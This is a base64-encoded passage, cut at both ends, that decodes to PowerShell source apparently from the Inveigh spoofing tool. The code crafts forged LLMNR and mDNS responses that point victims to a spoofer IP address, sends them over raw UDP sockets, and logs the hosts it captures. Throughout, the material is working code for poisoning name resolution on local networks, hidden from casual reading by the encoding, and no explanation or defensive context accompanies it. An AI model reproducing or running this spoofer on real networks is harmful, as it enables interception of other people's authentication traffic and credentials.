AkbUROU19yZXNwb25zZV9tZXNzYWdlID0gIi0gJHNvdXJjZV9JUCBpcyBvbiBpZ25vcmUgbGlzdCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSBub3Qgc3Bvb2ZlZCBkdWUgdG8gcHJldmlvdXMgY2FwdHVyZSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIG1ETlMoUU0pIHJlcXVlc3QgZm9yICRtRE5TX3F1ZXJ5X3N0cmluZ19mdWxsIHJlY2VpdmVkIGZyb20gJHNvdXJjZV9JUCAkbUROU19yZXNwb25zZV9tZXNzYWdlIikKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gbUROUyhRTSkgcmVxdWVzdCBmb3IgJG1ETlNfcXVlcnlfc3RyaW5nX2Z1bGwgcmVjZWl2ZWQgZnJvbSAkc291cmNlX0lQICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBtRE5TKFFNKSByZXF1ZXN0IGZvciAkbUROU19xdWVyeV9zdHJpbmdfZnVsbCByZWNlaXZlZCBmcm9tICRzb3VyY2VfSVAgJG1ETlNfcmVzcG9uc2VfbWVzc2FnZSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgNTM1NSAjIExMTU5SCiAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkcGF5bG9hZF9ieXRlc1soJHBheWxvYWRfYnl0ZXMuTGVuZ3RoIC0gNCkuLigkcGF5bG9hZF9ieXRlcy5MZW5ndGggLSAzKV0pIC1uZSAnMDAtMWMnKSAjIGlnbm9yZSBBQUFBIGZvciBub3cKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVEUF9sZW5ndGhbMF0gKz0gJHBheWxvYWRfYnl0ZXMuTGVuZ3RoIC0gMgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX3Jlc3BvbnNlX2RhdGEgPSAkcGF5bG9hZF9ieXRlc1sxMi4uJHBheWxvYWRfYnl0ZXMuTGVuZ3RoXQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9yZXNwb25zZV9kYXRhICs9ICRMTE1OUl9yZXNwb25zZV9kYXRhICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9UVExfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDA0ICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIChbU3lzdGVtLk5ldC5JUEFkZHJlc3NdW1N0cmluZ10oW1N5c3RlbS5OZXQuSVBBZGRyZXNzXSRTcG9vZmVySVApKS5HZXRBZGRyZXNzQnl0ZXMoKQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9yZXNwb25zZV9wYWNrZXQgPSAweDE0LDB4ZWIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzb3VyY2VfcG9ydFsxLDBdICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVURQX2xlbmd0aFsxLDBdICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYXlsb2FkX2J5dGVzWzAsMV0gKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4ODAsMHgwMCwweDAwLDB4MDEsMHgwMCwweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9yZXNwb25zZV9kYXRhCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9xdWVyeSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJHBheWxvYWRfYnl0ZXNbMTMuLigkcGF5bG9hZF9ieXRlcy5MZW5ndGggLSA0KV0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTExNTlJfcXVlcnkgPSAkTExNTlJfcXVlcnkgLXJlcGxhY2UgIi0wMCIsIiIKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkTExNTlJfcXVlcnkuTGVuZ3RoIC1lcSAyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9xdWVyeSA9IFtDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJExMTU5SX3F1ZXJ5LDE2KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9xdWVyeV9zdHJpbmcgPSBOZXctT2JqZWN0IFN5c3RlbS5TdHJpbmcoJExMTU5SX3F1ZXJ5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9xdWVyeSA9ICRMTE1OUl9xdWVyeS5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX3F1ZXJ5X3N0cmluZyA9IE5ldy1PYmplY3QgU3lzdGVtLlN0cmluZygkTExNTlJfcXVlcnksMCwkTExNTlJfcXVlcnkuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9yZXF1ZXN0X2lnbm9yZSA9ICRmYWxzZQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkTExNTlIgLWVxICdZJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNwb29mZXJMZWFybmluZyAtZXEgJ1knIC1hbmQgJGludmVpZ2gudmFsaWRfaG9zdF9saXN0IC1ub3Rjb250YWlucyAkTExNTlJfcXVlcnlfc3RyaW5nIC1hbmQgJHNvdXJjZV9JUCAtbmUgJElQKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCgkTExNTlJfbGVhcm5pbmdfbG9nLkV4aXN0cyh7cGFyYW0oJHMpICRzIC1saWtlICIyMCogJExMTU5SX3F1ZXJ5X3N0cmluZyJ9KSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9sZWFybmluZ19xdWV1ZV90aW1lID0gW0RhdGVUaW1lXSRMTE1OUl9sZWFybmluZ19sb2cuRmluZCh7cGFyYW0oJHMpICRzIC1saWtlICIyMCogJExMTU5SX3F1ZXJ5X3N0cmluZyJ9KS5TdWJTdHJpbmcoMCwxOSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigoR2V0LURhdGUpIC1nZSAkTExNTlJfbGVhcm5pbmdfcXVldWVfdGltZS5BZGRNaW51dGVzKCRTcG9vZmVyTGVhcm5pbmdJbnRlcnZhbCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX2xlYXJuaW5nX2xvZy5SZW1vdmVBdCgkTExNTlJfbGVhcm5pbmdfbG9nLkZpbmRJbmRleCh7cGFyYW0oJHMpICRzIC1saWtlICIyMCogJExMTU5SX3F1ZXJ5X3N0cmluZyJ9KSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTExNTlJfbGVhcm5pbmdfc2VuZCA9ICR0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX2xlYXJuaW5nX3NlbmQgPSAkZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7ICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9sZWFybmluZ19zZW5kID0gJHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJExMTU5SX2xlYXJuaW5nX3NlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl90cmFuc2FjdGlvbl9JRCA9IFtTdHJpbmddKDEuLjIgfCBGb3JFYWNoLU9iamVjdCB7InswOlgyfSIgLWYgKEdldC1SYW5kb20gLU1pbmltdW0gMSAtTWF4aW11bSAyNTUpfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl90cmFuc2FjdGlvbl9JRF9ieXRlcyA9ICRMTE1OUl90cmFuc2FjdGlvbl9JRC5TcGxpdCgiICIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTExNTlJfdHJhbnNhY3Rpb25fSUQgPSAkTExNTlJfdHJhbnNhY3Rpb25fSUQgLXJlcGxhY2UgIiAiLCItIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX1VEUF9jbGllbnQgPSBuZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5VZHBDbGllbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9ob3N0bmFtZV9ieXRlcyA9ICRwYXlsb2FkX2J5dGVzWzEzLi4oJHBheWxvYWRfYnl0ZXMuTGVuZ3RoIC0gNSldCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX3JlcXVlc3RfcGFja2V0ID0gJExMTU5SX3RyYW5zYWN0aW9uX0lEX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDEsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKCRMTE1OUl9ob3N0bmFtZV9ieXRlcy5MZW5ndGggLSAxKSArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTExNTlJfaG9zdG5hbWVfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAxLDB4MDAsMHgwMQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9sZWFybmluZ19kZXN0aW5hdGlvbl9lbmRwb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZHBvaW50KFtJUEFkZHJlc3NdIjIyNC4wLjAuMjUyIiw1MzU1KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX1VEUF9jbGllbnQuQ29ubmVjdCgkTExNTlJfbGVhcm5pbmdfZGVzdGluYXRpb25fZW5kcG9pbnQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTExNTlJfVURQX2NsaWVudC5TZW5kKCRMTE1OUl9yZXF1ZXN0X3BhY2tldCwkTExNTlJfcmVxdWVzdF9wYWNrZXQuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX1VEUF9jbGllbnQuQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX2xlYXJuaW5nX2xvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpICRMTE1OUl90cmFuc2FjdGlvbl9JRCAkTExNTlJfcXVlcnlfc3RyaW5nIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIExMTU5SIHJlcXVlc3QgZm9yICRMTE1OUl9xdWVyeV9zdHJpbmcgc2VudCB0byAyMjQuMC4wLjI1MiIpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIExMTU5SIHJlcXVlc3QgZm9yICRMTE1OUl9xdWVyeV9zdHJpbmcgc2VudCB0byAyMjQuMC4wLjI1MiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIExMTU5SIHJlcXVlc3QgZm9yICRMTE1OUl9xdWVyeV9zdHJpbmcgc2VudCB0byAyMjQuMC4wLjI1MiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoKCRpbnZlaWdoLnZhbGlkX2hvc3RfbGlzdCAtbm90Y29udGFpbnMgJExMTU5SX3F1ZXJ5X3N0cmluZyAtb3IgJFNwb29mZXJIb3N0c1JlcGx5IC1jb250YWlucyAkTExNTlJfcXVlcnlfc3RyaW5nKSAtYW5kICghJFNwb29mZXJIb3N0c1JlcGx5IC1vciAkU3Bvb2Zlckhvc3RzUmVwbHkgLWNvbnRhaW5zICRMTE1OUl9xdWVyeV9zdHJpbmcpIC1hbmQgKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICEkU3Bvb2Zlckhvc3RzSWdub3JlIC1vciAkU3Bvb2Zlckhvc3RzSWdub3JlIC1ub3Rjb250YWlucyAkTExNTlJfcXVlcnlfc3RyaW5nKSAtYW5kICghJFNwb29mZXJJUHNSZXBseSAtb3IgJFNwb29mZXJJUHNSZXBseSAtY29udGFpbnMgJHNvdXJjZV9JUCkgLWFuZCAoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgISRTcG9vZmVySVBzSWdub3JlIC1vciAkU3Bvb2ZlcklQc0lnbm9yZSAtbm90Y29udGFpbnMgJHNvdXJjZV9JUCkgLWFuZCAoJGludmVpZ2guc3Bvb2Zlcl9yZXBlYXQgLW9yICRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCAtbm90Y29udGFpbnMgJHNvdXJjZV9JUC5JUEFkZHJlc3NUb1N0cmluZykgLWFuZCAoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNwb29mZXJMZWFybmluZyAtZXEgJ04nIC1vciAoJFNwb29mZXJMZWFybmluZyAtZXEgJ1knIC1hbmQgISRTcG9vZmVyTGVhcm5pbmdEZWxheSkgLW9yICgkU3Bvb2ZlckxlYXJuaW5nRGVsYXkgLWFuZCAkc3Bvb2Zlcl9sZWFybmluZ19zdG9wd2F0Y2guRWxhcHNlZCAtZ2UgJHNwb29mZXJfbGVhcm5pbmdfZGVsYXkpKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkU3Bvb2ZlckxlYXJuaW5nIC1lcSAnTicgLW9yICEkTExNTlJfbGVhcm5pbmdfbG9nLkV4aXN0cyh7cGFyYW0oJHMpICRzIC1saWtlICIqICIgKyBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRwYXlsb2FkX2J5dGVzWzAuLjFdKSArICIgKiJ9KSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX3NlbmRfc29ja2V0ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0KFtTeXN0ZW0uTmV0LlNvY2tldHMuQWRkcmVzc0ZhbWlseV06OkludGVyTmV0d29yayxbU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldFR5cGVdOjpSYXcsW1N5c3RlbS5OZXQuU29ja2V0cy5Qcm90b2NvbFR5cGVdOjpVZHAgKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX3NlbmRfc29ja2V0LlNlbmRCdWZmZXJTaXplID0gMTAyNAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX2Rlc3RpbmF0aW9uX3BvaW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LklQRW5kcG9pbnQoJHNvdXJjZV9JUCwkZW5kcG9pbnRfc291cmNlX3BvcnQpIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX3NlbmRfc29ja2V0LlNlbmRUbygkTExNTlJfcmVzcG9uc2VfcGFja2V0LCRMTE1OUl9kZXN0aW5hdGlvbl9wb2ludCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9zZW5kX3NvY2tldC5DbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTExNTlJfcmVzcG9uc2VfbWVzc2FnZSA9ICItIHJlc3BvbnNlIHNlbnQiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTExNTlJfcmVxdWVzdF9pZ25vcmUgPSAkdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkU3Bvb2Zlckhvc3RzUmVwbHkgLWFuZCAkU3Bvb2Zlckhvc3RzUmVwbHkgLW5vdGNvbnRhaW5zICRMTE1OUl9xdWVyeV9zdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9yZXNwb25zZV9tZXNzYWdlID0gIi0gJExMTU5SX3F1ZXJ5X3N0cmluZyBpcyBub3Qgb24gcmVwbHkgbGlzdCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJFNwb29mZXJIb3N0c0lnbm9yZSAtYW5kICRTcG9vZmVySG9zdHNJZ25vcmUgLWNvbnRhaW5zICRMTE1OUl9xdWVyeV9zdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9yZXNwb25zZV9tZXNzYWdlID0gIi0gJExMTU5SX3F1ZXJ5X3N0cmluZyBpcyBvbiBpZ25vcmUgbGlzdCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJFNwb29mZXJJUHNSZXBseSAtYW5kICRTcG9vZmVySVBzUmVwbHkgLW5vdGNvbnRhaW5zICRzb3VyY2VfSVApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9yZXNwb25zZV9tZXNzYWdlID0gIi0gJHNvdXJjZV9JUCBpcyBub3Qgb24gcmVwbHkgbGlzdCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJFNwb29mZXJJUHNJZ25vcmUgLWFuZCAkU3Bvb2ZlcklQc0lnbm9yZSAtY29udGFpbnMgJHNvdXJjZV9JUCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSAkc291cmNlX0lQIGlzIG9uIGlnbm9yZSBsaXN0IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZigkaW52ZWlnaC52YWxpZF9ob3N0X2xpc3QgLWNvbnRhaW5zICRMTE1OUl9xdWVyeV9zdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9yZXNwb25zZV9tZXNzYWdlID0gIi0gJExMTU5SX3F1ZXJ5X3N0cmluZyBpcyBhIHZhbGlkIGhvc3QiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKCRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCAtY29udGFpbnMgJHNvdXJjZV9JUC5JUEFkZHJlc3NUb1N0cmluZykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSBwcmV2aW91cyBjYXB0dXJlIGZyb20gJHNvdXJjZV9JUCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJFNwb29mZXJMZWFybmluZ0RlbGF5IC1hbmQgJHNwb29mZXJfbGVhcm5pbmdfc3RvcHdhdGNoLkVsYXBzZWQgLWx0ICRzcG9vZmVyX2xlYXJuaW5nX2RlbGF5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTExNTlJfcmVzcG9uc2VfbWVzc2FnZSA9ICItICIgKyBbSW50XSgkU3Bvb2ZlckxlYXJuaW5nRGVsYXkgLSAkc3Bvb2Zlcl9sZWFybmluZ19zdG9wd2F0Y2guRWxhcHNlZC5Ub3RhbE1pbnV0ZXMpICsgIiBtaW51dGUocykgdW50aWwgc3Bvb2Zpbmcgc3RhcnRzIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSBzb21ldGhpbmcgd2VudCB3cm9uZyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCEkTExNTlJfcmVxdWVzdF9pZ25vcmUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gTExNTlIgcmVxdWVzdCBmb3IgJExMTU5SX3F1ZXJ5X3N0cmluZyByZWNlaXZlZCBmcm9tICRzb3VyY2VfSVAgJExMTU5SX3Jlc3BvbnNlX21lc3NhZ2UiKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBMTE1OUiByZXF1ZXN0IGZvciAkTExNTlJfcXVlcnlfc3RyaW5nIHJlY2VpdmVkIGZyb20gJHNvdXJjZV9JUCAkTExNTlJfcmVzcG9uc2VfbWVzc2FnZSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBMTE1OUiByZXF1ZXN0IGZvciAkTExNTlJfcXVlcnlfc3RyaW5nIHJlY2VpdmVkIGZyb20gJHNvdXJjZV9JUCAkTExNTlJfcmVzcG9uc2VfbWVzc2FnZSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA